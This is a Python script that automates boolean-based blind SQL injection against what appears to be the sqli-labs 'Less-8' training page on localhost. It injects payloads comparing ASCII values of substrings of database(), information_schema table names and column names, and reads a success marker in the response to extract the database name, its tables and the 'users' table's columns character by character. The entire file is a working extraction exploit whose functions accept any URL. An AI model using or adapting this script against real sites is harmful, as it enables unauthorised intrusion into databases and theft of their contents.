import requests
import re

def GetDataBaseName(code,url,right):
    addcode=" and length(database())="
    i=0
    max=256
    databasename=""
    databaselen=0
    while(1):
        r=requests.get(url,params=code+addcode+str(i)+"--+")
        if(re.search(right,r.text)):
            databaselen=i
            break
        else:
            i+=1

    i=1
    while(i<databaselen+1):
        j=0
        while(j<max):
            addcode=" and ascii(substr(database(),"+str(i)+",1))="+str(j)+" --+"
            r=requests.get(url,params=code+addcode)
            if(re.search(right,r.text)):
                databasename+=chr(j)
                break
            j+=1
        i+=1

    return databasename

def GetTable(code,url,right,databasename):
    tablelist=[]
    tablefin=0
    basefin=0

    i=1
    j=1
    i=0
    while(1):
        tablename=""
        j=1
        while(1):
            k=0
            while(k<128):
                addcode=" and ascii(substr((select table_name from information_schema.tables where table_schema='"+databasename+"' limit "+str(i)+",1),"+str(j)+",1))="+str(k)+" --+"
                r=requests.get(url,code+addcode)
                if(re.search(right,r.text)):
                    if(k==0 and j==1):
                        basefin=1
                        break
                    elif(k==0):
                        tablefin=1
                        break
                    else:
                        tablename+=chr(k)
                        break
                k+=1
            if(k==128):
                basefin=1
                break
            j+=1
            if(tablefin==1):
                tablefin=0
                break
            if(basefin==1):
                break
        if(basefin==1):
            break
        i+=1
        tablelist.append(tablename)
    return tablelist

def GetColumn(code,url,right,tablename):
    columnlist=[]
    tablefin=0
    columnfin=0
    i=0
    while(1):
        columnname=""
        j=1
        while(1):
            k=0
            while(k<128):
                addcode=" and ascii(substr((select column_name from information_schema.columns where table_name='"+tablename+"' limit "+str(i)+",1),"+str(j)+",1))="+str(k)+" --+"
                r=requests.get(url,code+addcode)
                if(re.search(right,r.text)):
                    if(k==0 and j==1):
                        tablefin=1
                        break
                    elif(k==0):
                        columnfin=1
                        break
                    else:
                        columnname+=chr(k)
                        break
                k+=1
            if(k==128):
                tablefin=1
                break
            j+=1
            if(columnfin==1):
                columnfin=0
                break
            if(tablefin==1):
                break
        if(tablefin==1):
            break

        i+=1
        columnlist.append(columnname)
    return columnlist


code="id=1'"
right="You are in..........."
url="http://localhost/sqli-labs-master/Less-8"
data={'id':code}
databasename="security"
databasename=GetDataBaseName(code,url,right)
print("DataBaseName:",databasename)
tablelist=GetTable(code,url,right,databasename)
print(tablelist)
tablename='users'
print("table name:",tablename)
columnlist=GetColumn(code,url,right,tablename)
print(columnlist)
